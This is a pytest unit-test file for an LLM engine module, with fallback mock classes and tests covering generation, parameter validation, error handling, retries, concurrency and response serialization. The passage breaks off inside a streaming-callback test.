"""
Comprehensive unit tests for the LLM engine module.
Tests cover happy paths, edge cases, error conditions, and failure scenarios.

Testing Framework: pytest (with unittest.mock for mocking)
"""

import pytest
import unittest.mock as mock
from unittest.mock import Mock, patch, MagicMock, call, AsyncMock
import json
import asyncio
from typing import Dict, List, Any, Optional
import sys
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Add the parent directory to the path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# Try to import the actual LLM engine classes
try:
    from CharacterClient.src.llm_engine import *
except ImportError:
    try:
        from src.llm_engine import *
    except ImportError:
        try:
            from llm_engine import *
        except ImportError:
            # Create mock classes for testing if imports fail
            class LLMEngine:
                def __init__(self, config=None):
                    """
                    Initialize the LLMEngine with the provided configuration.
                    
                    If no configuration is given, default values are used for all parameters.
                    """
                    self.config = config or {}
                    self.api_key = getattr(config, 'api_key', 'test-key')
                    self.model = getattr(config, 'model', 'gpt-3.5-turbo')
                    self.temperature = getattr(config, 'temperature', 0.7)
                    self.max_tokens = getattr(config, 'max_tokens', 150)
                    self.timeout = getattr(config, 'timeout', 30)
                    self.retry_count = getattr(config, 'retry_count', 3)
                
                def generate(self, prompt, **kwargs):
                    """
                    Generates a response to the given prompt using the configured language model.
                    
                    Parameters:
                        prompt (str): The input text prompt to generate a response for.
                    
                    Returns:
                        LLMResponse: The generated response object.
                    
                    Raises:
                        ValueError: If the prompt is empty or None.
                        TokenLimitExceededError: If the prompt exceeds the maximum allowed length.
                    """
                    if not prompt or prompt is None:
                        raise ValueError("Prompt cannot be empty or None")
                    if len(prompt) > 50000:
                        raise TokenLimitExceededError("Prompt too long")
                    return LLMResponse(f"Response to: {prompt[:50]}...", 25, self.model)
                
                async def generate_async(self, prompt, **kwargs):
                    """
                    Asynchronously generates a response for the given prompt using the LLM engine.
                    
                    Parameters:
                        prompt (str): The input prompt to generate a response for.
                    
                    Returns:
                        LLMResponse: The generated response object.
                    """
                    return self.generate(prompt, **kwargs)
                
                def batch_generate(self, prompts, **kwargs):
                    """
                    Generate responses for a list of prompts.
                    
                    Parameters:
                        prompts (list): A list of prompt strings to generate responses for.
                    
                    Returns:
                        list: A list of LLMResponse objects corresponding to each prompt.
                    """
                    return [self.generate(prompt, **kwargs) for prompt in prompts]
                
                def generate_stream(self, prompt, **kwargs):
                    """
                    Yields the response to a prompt as a stream of words.
                    
                    Parameters:
                        prompt (str): The input prompt to generate a response for.
                    
                    Yields:
                        str: The next word in the generated response, followed by a space.
                    """
                    words = f"Response to: {prompt}".split()
                    for word in words:
                        yield word + " "
                
                def _make_api_call(self, prompt, **kwargs):
                    """
                    Simulate an API call to generate a response for the given prompt.
                    
                    Returns:
                        LLMResponse: A mock response object containing the generated text, token count, and model name.
                    """
                    return LLMResponse(f"API response to: {prompt}", 25, self.model)
                
                async def _make_api_call_async(self, prompt, **kwargs):
                    """
                    Asynchronously performs an API call to generate a response for the given prompt.
                    
                    Returns:
                        The result of the synchronous API call for the provided prompt.
                    """
                    return self._make_api_call(prompt, **kwargs)
            
            class LLMResponse:
                def __init__(self, text="", tokens=0, model="", metadata=None):
                    """
                    Initialize an LLMResponse object with response text, token count, model name, and optional metadata.
                    
                    Parameters:
                        text (str): The generated response text.
                        tokens (int): The number of tokens in the response.
                        model (str): The name of the model that generated the response.
                        metadata (dict, optional): Additional metadata about the response.
                    """
                    self.text = text
                    self.tokens = tokens
                    self.model = model
                    self.metadata = metadata or {}
                
                def __str__(self):
                    """
                    Return the response text as a string representation of the object.
                    """
                    return self.text
                
                def to_dict(self):
                    """
                    Serialize the response object to a dictionary containing text, token count, model name, and metadata.
                    
                    Returns:
                        dict: A dictionary representation of the response with keys 'text', 'tokens', 'model', and 'metadata'.
                    """
                    return {
                        'text': self.text,
                        'tokens': self.tokens,
                        'model': self.model,
                        'metadata': self.metadata
                    }
            
            class LLMConfig:
                def __init__(self, **kwargs):
                    """
                    Initialize an LLMConfig instance with optional configuration parameters.
                    
                    Parameters:
                    	model (str, optional): The model name to use. Defaults to 'gpt-3.5-turbo'.
                    	temperature (float, optional): Sampling temperature for generation. Defaults to 0.7.
                    	max_tokens (int, optional): Maximum number of tokens to generate. Defaults to 150.
                    	api_key (str, optional): API key for authentication. Defaults to 'test-key'.
                    	timeout (int, optional): Request timeout in seconds. Defaults to 30.
                    	retry_count (int, optional): Number of retry attempts for failed requests. Defaults to 3.
                    """
                    self.model = kwargs.get('model', 'gpt-3.5-turbo')
                    self.temperature = kwargs.get('temperature', 0.7)
                    self.max_tokens = kwargs.get('max_tokens', 150)
                    self.api_key = kwargs.get('api_key', 'test-key')
                    self.timeout = kwargs.get('timeout', 30)
                    self.retry_count = kwargs.get('retry_count', 3)
                
                def to_dict(self):
                    """
                    Return a dictionary representation of the object's attributes.
                    """
                    return self.__dict__
            
            class LLMError(Exception):
                def __init__(self, message, error_code=None, details=None):
                    """
                    Initialize an LLMError with a message, optional error code, and additional details.
                    
                    Parameters:
                        message (str): Description of the error.
                        error_code (Optional[str]): Optional error code identifying the error type.
                        details (Optional[dict]): Additional context or metadata about the error.
                    """
                    super().__init__(message)
                    self.error_code = error_code
                    self.details = details or {}
            
            class TokenLimitExceededError(LLMError):
                pass
            
            class APIConnectionError(LLMError):
                pass
            
            class InvalidModelError(LLMError):
                pass
            
            class RateLimitError(LLMError):
                pass


class TestLLMEngine:
    """Comprehensive test suite for LLM Engine functionality."""
    
    @pytest.fixture
    def default_config(self):
        """
        Returns a default LLMConfig instance with standard test parameters for model, temperature, max_tokens, API key, timeout, and retry count.
        """
        return LLMConfig(
            model="gpt-3.5-turbo",
            temperature=0.7,
            max_tokens=150,
            api_key="test-key-12345",
            timeout=30,
            retry_count=3
        )
    
    @pytest.fixture
    def minimal_config(self):
        """
        Return a minimal LLMConfig instance with only the model parameter set.
        
        Used for testing edge cases where default or minimal configuration is required.
        """
        return LLMConfig(model="gpt-3.5-turbo")
    
    @pytest.fixture
    def llm_engine(self, default_config):
        """
        Create and return an LLMEngine instance using the provided default configuration.
        
        Parameters:
            default_config (LLMConfig): The configuration object to initialize the LLM engine.
            
        Returns:
            LLMEngine: An instance of the LLM engine initialized with the given configuration.
        """
        return LLMEngine(default_config)
    
    @pytest.fixture
    def mock_response(self):
        """
        Return a mock LLMResponse object simulating a typical API response for testing purposes.
        
        Returns:
            LLMResponse: A response object with preset text, token count, model, and metadata.
        """
        return LLMResponse(
            text="This is a comprehensive test response that simulates real API output.",
            tokens=25,
            model="gpt-3.5-turbo",
            metadata={
                "finish_reason": "stop", 
                "usage": {"total_tokens": 25, "prompt_tokens": 10, "completion_tokens": 15},
                "created": 1234567890,
                "id": "chatcmpl-test123"
            }
        )
    
    @pytest.fixture
    def mock_error_response(self):
        """
        Return a simulated APIConnectionError instance for use in error handling tests.
        
        Returns:
            APIConnectionError: An error object representing a simulated API failure with error code and retry details.
        """
        return APIConnectionError("Simulated API error", error_code=500, details={"retry_after": 60})

    # === INITIALIZATION TESTS ===
    
    def test_llm_engine_initialization_with_full_config(self, default_config):
        """
        Test that the LLM engine initializes correctly when provided with a complete configuration.
        
        Verifies that all configuration attributes are set as expected, including API key, model, temperature, and max tokens.
        """
        engine = LLMEngine(default_config)
        assert engine.config == default_config
        assert hasattr(engine, 'config')
        assert engine.api_key == "test-key-12345"
        assert engine.model == "gpt-3.5-turbo"
        assert engine.temperature == 0.7
        assert engine.max_tokens == 150
    
    def test_llm_engine_initialization_with_minimal_config(self, minimal_config):
        """
        Test that the LLM engine initializes correctly when provided with a minimal configuration.
        
        Asserts that the engine's configuration matches the minimal config and that the default model is set.
        """
        engine = LLMEngine(minimal_config)
        assert engine.config == minimal_config
        assert engine.model == "gpt-3.5-turbo"
    
    def test_llm_engine_initialization_without_config(self):
        """
        Test that the LLM engine initializes with default configuration when no config is provided.
        
        Asserts that the engine instance has the expected configuration and model attributes.
        """
        engine = LLMEngine()
        assert hasattr(engine, 'config')
        assert hasattr(engine, 'model')
    
    def test_llm_engine_initialization_with_none_config(self):
        """
        Test that the LLM engine initializes correctly when provided with a None configuration.
        
        Verifies that the engine still has a 'config' attribute after initialization with None.
        """
        engine = LLMEngine(None)
        assert hasattr(engine, 'config')
    
    def test_llm_engine_initialization_with_empty_dict_config(self):
        """
        Test that the LLM engine initializes correctly when provided with an empty dictionary as its configuration.
        """
        engine = LLMEngine({})
        assert hasattr(engine, 'config')

    # === HAPPY PATH TESTS ===
    
    def test_generate_simple_prompt(self, llm_engine, mock_response):
        """
        Test that the LLM engine generates a valid response for a simple prompt.
        
        Verifies that the generated result is either a string or an LLMResponse, and that the response content matches the expected mock response.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate("Hello, how are you today?")
            assert isinstance(result, (str, LLMResponse))
            if isinstance(result, LLMResponse):
                assert result.text == mock_response.text
                assert result.tokens == mock_response.tokens
    
    def test_generate_with_custom_temperature(self, llm_engine, mock_response):
        """
        Test that the LLM engine generates text using a custom temperature parameter.
        
        Verifies that the engine's generate method accepts and applies a custom temperature value, and that the response is of the expected type.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response) as mock_call:
            result = llm_engine.generate("Tell me a creative story", temperature=0.9)
            assert isinstance(result, (str, LLMResponse))
            mock_call.assert_called_once()
    
    def test_generate_with_custom_max_tokens(self, llm_engine, mock_response):
        """
        Test that the LLM engine generates text correctly when a custom max_tokens parameter is provided.
        
        Verifies that the generate method accepts and applies the max_tokens override, and that the response is of the expected type.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response) as mock_call:
            result = llm_engine.generate("Explain quantum physics", max_tokens=300)
            assert isinstance(result, (str, LLMResponse))
            mock_call.assert_called_once()
    
    def test_generate_with_multiple_parameters(self, llm_engine, mock_response):
        """
        Test that the LLM engine generates text correctly when multiple custom parameters are provided.
        
        Verifies that the engine accepts and applies parameters such as temperature, max_tokens, top_p, and frequency_penalty during text generation.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response) as mock_call:
            result = llm_engine.generate(
                "Write a poem about technology", 
                temperature=0.8, 
                max_tokens=200,
                top_p=0.9,
                frequency_penalty=0.1
            )
            assert isinstance(result, (str, LLMResponse))
            mock_call.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_generate_async_simple(self, llm_engine, mock_response):
        """
        Test that the asynchronous generate_async method returns a valid response for a simple prompt.
        
        Asserts that the result is either a string or an LLMResponse and that the underlying async API call is invoked once.
        """
        with patch.object(llm_engine, '_make_api_call_async', return_value=mock_response) as mock_call:
            result = await llm_engine.generate_async("Hello, async world!")
            assert isinstance(result, (str, LLMResponse))
            mock_call.assert_called_once()
    
    @pytest.mark.asyncio
    async def test_generate_async_with_parameters(self, llm_engine, mock_response):
        """
        Test that the asynchronous text generation method returns a valid response when called with custom parameters.
        """
        with patch.object(llm_engine, '_make_api_call_async', return_value=mock_response) as mock_call:
            result = await llm_engine.generate_async(
                "Explain async programming", 
                temperature=0.6, 
                max_tokens=250
            )
            assert isinstance(result, (str, LLMResponse))
            mock_call.assert_called_once()
    
    def test_batch_generate_multiple_prompts(self, llm_engine, mock_response):
        """
        Test that batch generation returns a response for each prompt in a list of multiple prompts.
        
        Verifies that the number of results matches the number of prompts and that each result is either a string or an LLMResponse instance.
        """
        prompts = [
            "What is artificial intelligence?",
            "Explain machine learning",
            "Define natural language processing",
            "What is deep learning?"
        ]
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            if hasattr(llm_engine, 'batch_generate'):
                results = llm_engine.batch_generate(prompts)
                assert len(results) == len(prompts)
                assert all(isinstance(r, (str, LLMResponse)) for r in results)
    
    def test_batch_generate_single_prompt(self, llm_engine, mock_response):
        """
        Test that batch generation returns a single response when given a single prompt.
        
        Verifies that the batch_generate method correctly processes a list containing one prompt and returns a single response object or string.
        """
        prompts = ["Single prompt for batch processing"]
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            if hasattr(llm_engine, 'batch_generate'):
                results = llm_engine.batch_generate(prompts)
                assert len(results) == 1
                assert isinstance(results[0], (str, LLMResponse))
    
    def test_generate_stream_functionality(self, llm_engine):
        """
        Test that the LLM engine's streaming generation method yields response chunks as expected.
        
        Verifies that the `generate_stream` method produces the correct sequence of output chunks and that the concatenated result matches the expected response.
        """
        if hasattr(llm_engine, 'generate_stream'):
            def mock_stream():
                """
                Simulates a streaming response by yielding segments of a sample message one at a time.
                """
                yield "Hello"
                yield " "
                yield "streaming"
                yield " "
                yield "world"
            
            with patch.object(llm_engine, 'generate_stream', return_value=mock_stream()):
                chunks = list(llm_engine.generate_stream("Test streaming"))
                assert len(chunks) == 5
                assert "".join(chunks) == "Hello streaming world"

    # === EDGE CASES AND BOUNDARY CONDITIONS ===
    
    def test_generate_empty_string_prompt(self, llm_engine):
        """
        Test that generating with an empty string prompt raises a ValueError or LLMError.
        """
        with pytest.raises((ValueError, LLMError)):
            llm_engine.generate("")
    
    def test_generate_whitespace_only_prompt(self, llm_engine):
        """
        Test that generating with a whitespace-only prompt raises a ValueError or LLMError.
        """
        with pytest.raises((ValueError, LLMError)):
            llm_engine.generate("   \n\t   ")
    
    def test_generate_none_prompt(self, llm_engine):
        """
        Test that generating with a None prompt raises a ValueError, TypeError, or LLMError.
        """
        with pytest.raises((ValueError, TypeError, LLMError)):
            llm_engine.generate(None)
    
    def test_generate_numeric_prompt(self, llm_engine, mock_response):
        """
        Test that the LLM engine correctly handles a numeric prompt by converting it to a string and generating a response.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate(12345)
            assert isinstance(result, (str, LLMResponse))
    
    def test_generate_very_long_prompt(self, llm_engine):
        """
        Test that the LLM engine raises an appropriate exception when generating text from a prompt that exceeds the maximum allowed token limit.
        """
        long_prompt = "This is a very long prompt. " * 2000  # ~10,000+ characters
        with pytest.raises((TokenLimitExceededError, LLMError, ValueError)):
            llm_engine.generate(long_prompt)
    
    def test_generate_with_zero_max_tokens(self, llm_engine):
        """
        Test that generating text with `max_tokens` set to zero raises a ValueError or LLMError.
        """
        with pytest.raises((ValueError, LLMError)):
            llm_engine.generate("Hello", max_tokens=0)
    
    def test_generate_with_negative_max_tokens(self, llm_engine):
        """
        Test that generating text with a negative max_tokens value raises a ValueError or LLMError.
        """
        with pytest.raises((ValueError, LLMError)):
            llm_engine.generate("Hello", max_tokens=-50)
    
    def test_generate_with_excessive_max_tokens(self, llm_engine):
        """
        Test that generating text with an excessively high max_tokens value raises an appropriate exception.
        """
        with pytest.raises((ValueError, LLMError, TokenLimitExceededError)):
            llm_engine.generate("Hello", max_tokens=1000000)
    
    def test_generate_with_negative_temperature(self, llm_engine):
        """
        Test that generating text with a negative temperature raises a ValueError or LLMError.
        """
        with pytest.raises((ValueError, LLMError)):
            llm_engine.generate("Hello", temperature=-0.5)
    
    def test_generate_with_temperature_too_high(self, llm_engine):
        """
        Test that generating text with a temperature value above the valid range (>2.0) raises a ValueError or LLMError.
        """
        with pytest.raises((ValueError, LLMError)):
            llm_engine.generate("Hello", temperature=3.0)
    
    def test_generate_with_temperature_edge_values(self, llm_engine, mock_response):
        """
        Test that the LLM engine generates responses correctly when using the minimum and maximum valid temperature values (0.0 and 2.0).
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            # Test minimum valid temperature
            result1 = llm_engine.generate("Hello", temperature=0.0)
            assert isinstance(result1, (str, LLMResponse))
            
            # Test maximum valid temperature
            result2 = llm_engine.generate("Hello", temperature=2.0)
            assert isinstance(result2, (str, LLMResponse))
    
    def test_generate_with_invalid_model(self, llm_engine):
        """
        Test that generating text with a non-existent model raises an InvalidModelError or LLMError.
        """
        with pytest.raises((InvalidModelError, LLMError)):
            llm_engine.generate("Hello", model="non-existent-model-xyz")
    
    def test_generate_with_unicode_prompt(self, llm_engine, mock_response):
        """
        Verify that the LLM engine can generate responses for prompts containing Unicode characters, including non-Latin scripts and emojis.
        """
        unicode_prompts = [
            "Hello 世界",
            "Bonjour café",
            "Привет мир",
            "مرحبا عالم",
            "こんにちは世界",
            "🌍🚀✨ Emojis work too!"
        ]
        
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            for prompt in unicode_prompts:
                result = llm_engine.generate(prompt)
                assert isinstance(result, (str, LLMResponse))
    
    def test_batch_generate_empty_list(self, llm_engine):
        """
        Test that batch generation raises an error when given an empty prompt list.
        
        Asserts that calling `batch_generate` with an empty list raises either a ValueError or LLMError.
        """
        if hasattr(llm_engine, 'batch_generate'):
            with pytest.raises((ValueError, LLMError)):
                llm_engine.batch_generate([])
    
    def test_batch_generate_with_none_in_list(self, llm_engine):
        """
        Test that batch generation raises an error when the prompt list contains None values.
        
        Verifies that the LLM engine's batch_generate method raises a ValueError, TypeError, or LLMError if any prompt in the input list is None.
        """
        if hasattr(llm_engine, 'batch_generate'):
            with pytest.raises((ValueError, TypeError, LLMError)):
                llm_engine.batch_generate(["Valid prompt", None, "Another valid prompt"])

    # === ERROR HANDLING AND FAILURE SCENARIOS ===
    
    def test_api_connection_error_handling(self, llm_engine):
        """
        Test that the LLM engine raises an APIConnectionError when an API connection failure occurs during text generation.
        """
        with patch.object(llm_engine, '_make_api_call', side_effect=APIConnectionError("Connection failed")):
            with pytest.raises(APIConnectionError) as exc_info:
                llm_engine.generate("Hello")
            assert "Connection failed" in str(exc_info.value)
    
    def test_rate_limit_error_handling(self, llm_engine):
        """
        Test that the LLM engine raises a RateLimitError when a rate limit is exceeded during text generation.
        """
        with patch.object(llm_engine, '_make_api_call', side_effect=RateLimitError("Rate limit exceeded")):
            with pytest.raises(RateLimitError) as exc_info:
                llm_engine.generate("Hello")
            assert "Rate limit exceeded" in str(exc_info.value)
    
    def test_token_limit_exceeded_error_handling(self, llm_engine):
        """
        Test that the LLM engine raises a TokenLimitExceededError when the token limit is exceeded during generation.
        """
        with patch.object(llm_engine, '_make_api_call', side_effect=TokenLimitExceededError("Token limit exceeded")):
            with pytest.raises(TokenLimitExceededError) as exc_info:
                llm_engine.generate("Hello")
            assert "Token limit exceeded" in str(exc_info.value)
    
    def test_invalid_api_key_error(self):
        """
        Test that the LLM engine raises an APIConnectionError when an invalid API key is used.
        """
        config = LLMConfig(api_key="invalid-key-123")
        engine = LLMEngine(config)
        with patch.object(engine, '_make_api_call', side_effect=APIConnectionError("Invalid API key")):
            with pytest.raises(APIConnectionError) as exc_info:
                engine.generate("Hello")
            assert "Invalid API key" in str(exc_info.value)
    
    def test_network_timeout_error(self, llm_engine):
        """
        Test that the LLM engine raises a TimeoutError or APIConnectionError when a network timeout occurs during text generation.
        """
        with patch.object(llm_engine, '_make_api_call', side_effect=TimeoutError("Request timed out")):
            with pytest.raises((TimeoutError, APIConnectionError)):
                llm_engine.generate("Hello")
    
    def test_malformed_json_response_error(self, llm_engine):
        """
        Test that the LLM engine raises a JSONDecodeError or LLMError when the API response contains malformed JSON.
        """
        with patch.object(llm_engine, '_make_api_call', side_effect=json.JSONDecodeError("msg", "doc", 0)):
            with pytest.raises((json.JSONDecodeError, LLMError)):
                llm_engine.generate("Hello")
    
    def test_http_500_error(self, llm_engine):
        """
        Test that the LLM engine raises an APIConnectionError with error code 500 when an HTTP 500 server error occurs during generation.
        """
        server_error = APIConnectionError("Internal Server Error", error_code=500)
        with patch.object(llm_engine, '_make_api_call', side_effect=server_error):
            with pytest.raises(APIConnectionError) as exc_info:
                llm_engine.generate("Hello")
            assert exc_info.value.error_code == 500
    
    def test_http_403_error(self, llm_engine):
        """
        Test that the LLM engine raises an APIConnectionError with error code 403 when an HTTP 403 forbidden error occurs during generation.
        """
        forbidden_error = APIConnectionError("Forbidden", error_code=403)
        with patch.object(llm_engine, '_make_api_call', side_effect=forbidden_error):
            with pytest.raises(APIConnectionError) as exc_info:
                llm_engine.generate("Hello")
            assert exc_info.value.error_code == 403
    
    def test_unexpected_exception_handling(self, llm_engine):
        """
        Test that the LLM engine properly propagates unexpected exceptions raised during text generation.
        """
        with patch.object(llm_engine, '_make_api_call', side_effect=RuntimeError("Unexpected error")):
            with pytest.raises((RuntimeError, LLMError)):
                llm_engine.generate("Hello")

    # === RETRY LOGIC TESTS ===
    
    def test_retry_on_transient_failure(self, llm_engine, mock_response):
        """
        Test that the LLM engine retries API calls on transient failures and succeeds if a subsequent attempt is successful.
        
        Simulates initial API connection errors followed by a successful response, verifying that the retry mechanism attempts the call multiple times and ultimately returns a valid result.
        """
        with patch.object(llm_engine, '_make_api_call') as mock_call:
            mock_call.side_effect = [
                APIConnectionError("Transient failure"),
                APIConnectionError("Second failure"), 
                mock_response  # Success on third try
            ]
            
            # If the engine has retry logic, it should eventually succeed
            try:
                result = llm_engine.generate("Hello")
                assert mock_call.call_count == 3
                assert isinstance(result, (str, LLMResponse))
            except APIConnectionError:
                # If no retry logic, should fail on first attempt
                assert mock_call.call_count == 1
    
    def test_retry_exhaustion(self, llm_engine):
        """
        Test that the LLM engine raises an APIConnectionError when all retry attempts fail during generation.
        """
        persistent_error = APIConnectionError("Persistent failure")
        with patch.object(llm_engine, '_make_api_call', side_effect=persistent_error):
            with pytest.raises(APIConnectionError):
                llm_engine.generate("Hello")
    
    def test_no_retry_on_client_errors(self, llm_engine):
        """
        Verify that client (4xx) errors raised during generation are not retried by the LLM engine.
        
        Asserts that when a client error occurs, the engine raises the exception immediately without additional retry attempts.
        """
        client_error = APIConnectionError("Bad Request", error_code=400)
        with patch.object(llm_engine, '_make_api_call', side_effect=client_error) as mock_call:
            with pytest.raises(APIConnectionError):
                llm_engine.generate("Hello")
            # Should not retry client errors
            assert mock_call.call_count == 1

    # === CONFIGURATION TESTS ===
    
    def test_config_validation_valid_temperature(self):
        """
        Verify that the LLM engine correctly accepts and applies valid temperature values in its configuration.
        """
        valid_temps = [0.0, 0.5, 1.0, 1.5, 2.0]
        for temp in valid_temps:
            config = LLMConfig(temperature=temp)
            engine = LLMEngine(config)
            assert engine.temperature == temp
    
    def test_config_validation_invalid_temperature(self):
        """
        Verify that initializing LLMConfig or LLMEngine with invalid temperature values raises a ValueError or LLMError.
        """
        invalid_temps = [-1.0, -0.1, 2.1, 3.0, 100.0]
        for temp in invalid_temps:
            with pytest.raises((ValueError, LLMError)):
                config = LLMConfig(temperature=temp)
                LLMEngine(config)
    
    def test_config_validation_valid_max_tokens(self):
        """
        Verify that the LLM engine correctly accepts and applies valid max_tokens values during configuration.
        """
        valid_tokens = [1, 50, 100, 1000, 4000]
        for tokens in valid_tokens:
            config = LLMConfig(max_tokens=tokens)
            engine = LLMEngine(config)
            assert engine.max_tokens == tokens
    
    def test_config_validation_invalid_max_tokens(self):
        """
        Test that initializing LLMConfig or LLMEngine with invalid max_tokens values raises an error.
        
        Verifies that zero or negative max_tokens values are rejected by the configuration or engine.
        """
        invalid_tokens = [0, -1, -100]
        for tokens in invalid_tokens:
            with pytest.raises((ValueError, LLMError)):
                config = LLMConfig(max_tokens=tokens)
                LLMEngine(config)
    
    def test_config_defaults_applied(self):
        """
        Verify that the LLMEngine applies default configuration values when no configuration is provided.
        """
        engine = LLMEngine()
        assert hasattr(engine, 'model')
        assert hasattr(engine, 'temperature')
        assert hasattr(engine, 'max_tokens')
    
    def test_config_override_at_runtime(self, llm_engine, mock_response):
        """
        Test that parameters provided at runtime override the LLM engine's default configuration values.
        
        Verifies that calling the generate method with a runtime parameter (e.g., temperature) uses the provided value instead of the engine's default.
        """
        original_temp = llm_engine.temperature
        override_temp = 0.9 if original_temp != 0.9 else 0.1
        
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response) as mock_call:
            llm_engine.generate("Hello", temperature=override_temp)
            mock_call.assert_called_once()
            # The exact parameter passing depends on implementation

    # === RESPONSE FORMAT TESTS ===
    
    def test_response_format_text_extraction(self, llm_engine, mock_response):
        """
        Verify that the generated response contains extractable text and matches the expected mock response.
        
        Ensures that the response from the LLM engine, whether as an LLMResponse object or a string, includes non-empty text consistent with the mock response.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate("Hello")
            if isinstance(result, LLMResponse):
                assert result.text == mock_response.text
                assert len(result.text) > 0
            else:
                assert isinstance(result, str)
                assert len(result) > 0
    
    def test_response_format_metadata_preservation(self, llm_engine, mock_response):
        """
        Verify that the LLM engine's response preserves metadata fields when generating text.
        
        Ensures that the returned LLMResponse includes non-empty metadata with expected keys and correct token count.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate("Hello", include_metadata=True)
            if isinstance(result, LLMResponse):
                assert result.metadata is not None
                assert "finish_reason" in result.metadata
                assert "usage" in result.metadata
                assert result.tokens == mock_response.tokens
    
    def test_response_format_token_counting(self, llm_engine, mock_response):
        """
        Verify that the token count in the LLM response is a positive integer when generating a response.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate("Count my tokens")
            if isinstance(result, LLMResponse):
                assert result.tokens > 0
                assert isinstance(result.tokens, int)
    
    def test_response_serialization(self, llm_engine, mock_response):
        """
        Verify that LLM engine responses can be serialized to a dictionary and contain expected fields.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate("Serialize me")
            if isinstance(result, LLMResponse) and hasattr(result, 'to_dict'):
                response_dict = result.to_dict()
                assert isinstance(response_dict, dict)
                assert 'text' in response_dict
                assert 'tokens' in response_dict
                assert 'model' in response_dict

    # === PERFORMANCE AND CONCURRENCY TESTS ===
    
    def test_concurrent_requests_thread_safety(self, llm_engine, mock_response):
        """
        Verify that the LLM engine's generate method is thread-safe by making concurrent requests from multiple threads and ensuring all responses are returned without errors.
        """
        results = []
        errors = []
        
        def make_request(request_id):
            """
            Performs a single LLM engine generation request in a concurrent context, capturing the result or any exception.
            
            Parameters:
                request_id (int): Identifier for the concurrent request, used to construct the prompt.
            """
            try:
                with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
                    result = llm_engine.generate(f"Concurrent request {request_id}")
                    results.append(result)
            except Exception as e:
                errors.append(e)
        
        threads = [threading.Thread(target=make_request, args=(i,)) for i in range(10)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        
        assert len(errors) == 0, f"Concurrent requests failed with errors: {errors}"
        assert len(results) == 10
    
    @pytest.mark.asyncio
    async def test_concurrent_async_requests(self, llm_engine, mock_response):
        """
        Test that the LLM engine can handle multiple concurrent asynchronous generation requests without errors.
        
        Verifies that five asynchronous requests return successful responses and no exceptions are raised.
        """
        async def make_async_request(request_id):
            """
            Makes an asynchronous text generation request using the LLM engine, patching the internal async API call to return a mock response.
            
            Parameters:
                request_id: Identifier used to construct the prompt for the async request.
            
            Returns:
                LLMResponse: The mocked response object returned by the LLM engine.
            """
            with patch.object(llm_engine, '_make_api_call_async', return_value=mock_response):
                return await llm_engine.generate_async(f"Async request {request_id}")
        
        tasks = [make_async_request(i) for i in range(5)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        assert len(results) == 5
        assert all(not isinstance(r, Exception) for r in results)
    
    def test_response_time_performance(self, llm_engine, mock_response):
        """
        Test that the LLM engine's response time for a single generation call is below one second when using a mocked API call.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            start_time = time.time()
            llm_engine.generate("Performance test")
            end_time = time.time()
            
            response_time = end_time - start_time
            assert response_time < 1.0  # Should be very fast with mocked call
    
    def test_memory_usage_stability(self, llm_engine, mock_response):
        """
        Verify that repeated calls to the LLM engine's generate method do not result in memory leaks by generating multiple responses in succession.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            # Generate multiple responses to test memory stability
            for i in range(50):
                result = llm_engine.generate(f"Memory test {i}")
                assert result is not None
                # In a real implementation, you'd monitor memory usage here

    # === ADVANCED FUNCTIONALITY TESTS ===
    
    def test_conversation_context_management(self, llm_engine, mock_response):
        """
        Test that the LLM engine maintains conversation context across multiple generation calls.
        
        Verifies that follow-up prompts can reference information from previous prompts when context management is supported by the engine.
        """
        if hasattr(llm_engine, 'conversation_history') or hasattr(llm_engine, 'maintain_context'):
            with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
                # First message
                response1 = llm_engine.generate("Hello, I'm Alice")
                assert response1 is not None
                
                # Follow-up message that should reference context
                response2 = llm_engine.generate("What's my name?")
                assert response2 is not None
    
    def test_system_message_support(self, llm_engine, mock_response):
        """
        Test whether the LLM engine supports and correctly handles system messages during text generation.
        
        This test checks for the presence of system message support via a dedicated method or parameter, and verifies that a response is returned when a system message is provided.
        """
        if hasattr(llm_engine, 'set_system_message') or 'system_message' in llm_engine.generate.__code__.co_varnames:
            with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
                result = llm_engine.generate(
                    "Hello", 
                    system_message="You are a helpful assistant."
                )
                assert result is not None
    
    def test_function_calling_support(self, llm_engine, mock_response):
        """
        Test whether the LLM engine supports function calling by providing a function schema and verifying a response is returned.
        """
        if 'functions' in llm_engine.generate.__code__.co_varnames:
            functions = [
                {
                    "name": "get_weather",
                    "description": "Get weather information",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "location": {"type": "string"}
                        }
                    }
                }
            ]
            
            with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
                result = llm_engine.generate(
                    "What's the weather in New York?",
                    functions=functions
                )
                assert result is not None
    
    def test_streaming_with_callback(self, llm_engine):
        """
        Test that the LLM engine's streaming generation correctly invokes a callback for each streamed chunk.
        
        Verifies that when a callback is provided to the streaming generation method, it is called for each chunk of the streamed response.
        """
        if hasattr(llm_engine, 'generate_stream'):
            collected_chunks = []
            
            def chunk_callback(chunk):
                """
                Appends a received chunk to the collected_chunks list.
                
                Parameters:
                    chunk: The data chunk to be added to the collection.
                """
                collected_chunks.append(chunk)
            
